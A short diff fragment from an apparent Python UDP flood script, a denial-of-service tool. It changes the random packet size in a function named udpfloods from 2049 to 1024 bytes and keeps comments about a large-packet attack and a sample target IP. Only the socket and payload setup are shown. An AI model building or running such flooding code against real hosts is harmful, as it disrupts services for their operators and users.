@@ -6,7 +6,7 @@ import time
 
 def udpfloods(ip, port, user_input_time):
     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)  # Creates a socket
-    mybyte = random._urandom(2049)  # Creates packet#todo 大包攻击 大于1500
+    mybyte = random._urandom(1024)  # Creates packet#todo 大包攻击 大于1500
     # ip='10.1.12.173' #The IP we are attacking
     # port=80 #Port we direct to attack
     sent = 0
